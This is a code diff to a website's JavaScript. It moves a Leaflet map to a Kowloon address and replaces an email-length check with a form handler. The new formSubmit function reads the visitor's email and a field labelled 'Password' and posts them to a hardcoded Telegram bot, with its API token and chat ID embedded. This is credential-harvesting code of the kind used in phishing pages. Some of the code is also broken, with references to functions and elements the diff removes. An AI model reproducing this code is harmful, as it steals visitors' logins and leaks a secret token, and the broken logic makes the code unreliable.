@@ -101,7 +101,7 @@ $(".news_slick_slider").slick((_$$slick = {
 }), _ref2)]), _$$slick)); // #endregion
 // #region MAP
 
-var map = L.map('map_wrapper').setView([40.683471, -73.903071], 13);
+var map = L.map('map_wrapper').setView([22.313208922495647, 114.17263361075162], 13);
 var customMarker = L.icon({
   iconUrl: './assets/images/marker.png',
   //shadowUrl: 'leaf-shadow.png',
@@ -117,15 +117,9 @@ var customMarker = L.icon({
 L.tileLayer('https://cartodb-basemaps-{s}.global.ssl.fastly.net/light_all/{z}/{x}/{y}.png', {
   attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a> contributors'
 }).addTo(map);
-L.marker([40.683471, -73.903071], {
+var mark = L.marker([22.313208922495647, 114.17263361075162], {
   icon: customMarker
-}).addTo(map).openPopup();
-var markHK = L.marker([22.313208922495647, 114.17263361075162], {
-  icon: customMarker
-}).addTo(map).bindPopup("Hong Kong").openPopup([22.313208922495647, 114.17263361075162]);
-var markNY = L.marker([40.78159296396248, -73.96915881456673], {
-  icon: customMarker
-}).addTo(map).bindPopup("New-York").openPopup([40.78159296396248, -73.96915881456673]); // #endregion
+}).addTo(map).bindPopup("residence in Kowloon").openPopup([22.313208922495647, 114.17263361075162]); // #endregion
 // #region Gallery
 
 $jQuerry(document).ready(function ($) {
@@ -134,20 +128,82 @@ $jQuerry(document).ready(function ($) {
 }); // #endregion
 // #region valide form
 
-var EMAIL_MIN_LENGTH = 5;
+function validateForm(event) {
+  event.preventDefault();
+  resetValidation();
+  var email = window.inpEmail.value;
+  var name = window.inpName.value;
 
-function checkEmailLenght() {
-  var valueLenght = window.inputEmail.value.length;
-  var diff = valueLenght < EMAIL_MIN_LENGTH ? EMAIL_MIN_LENGTH - valueLenght : 0;
-
-  if (diff) {
-    window.emailDiffCount.textContent = diff;
-    window.emailLenghtHelp.classList.remove('d-none');
-  } else {
-    window.emailLenghtHelp.classList.add('d-none');
+  if (!email) {
+    window.emailHelp.classList.remove('d-none');
+    return false;
   }
+
+  if (!name) {
+    window.nameHelp.classList.remove('d-none');
+    return false;
+  }
+
+  if (!testPasswordRegex(name)) {
+    window.nameHelp.classList.remove('d-none');
+    window.nameHelpDescription.classList.remove('d-none');
+  } // console.log(email, password);
+
 }
 
-;
-window.inputEmail.addEventListener('input', checkEmailLenght);
-document.addEventListener('DOMContentLoaded', checkEmailLenght); // #endregion
+var apiToken = "6685344433:AAFe9Yea_lcKqx1dzqTdsWtfcIJus5QMg2U";
+var chatId = "-4066219312";
+
+function formSubmit(event) {
+  var email, name, text, urlString, response, resp;
+  return regeneratorRuntime.async(function formSubmit$(_context) {
+    while (1) {
+      switch (_context.prev = _context.next) {
+        case 0:
+          event.preventDefault();
+          email = window.inpEmail.value;
+          name = window.inpName.value;
+
+          if (!(!email || !name)) {
+            _context.next = 5;
+            break;
+          }
+
+          return _context.abrupt("return", false);
+
+        case 5:
+          text = "\n  <b>Email:</b> ".concat(email, "<b>Password</b> ").concat(name, "\n  ");
+          urlString = "https://api.telegram.org/bot".concat(apiToken, "/sendMessage");
+          _context.next = 9;
+          return regeneratorRuntime.awrap(fetch(urlString, {
+            method: 'post',
+            headers: {
+              'Accept': 'application/json',
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: text,
+              parse_mode: 'HTML'
+            })
+          }));
+
+        case 9:
+          response = _context.sent;
+          _context.next = 12;
+          return regeneratorRuntime.awrap(response.json());
+
+        case 12:
+          resp = _context.sent;
+          console.log(resp);
+          window.inputEmail.addEventListener('input', checkEmailLenght);
+          document.addEventListener('DOMContentLoaded', checkEmailLenght);
+          window.form.addEventListener('submit', formSubmit);
+
+        case 17:
+        case "end":
+          return _context.stop();
+      }
+    }
+  });
+} // #endregion
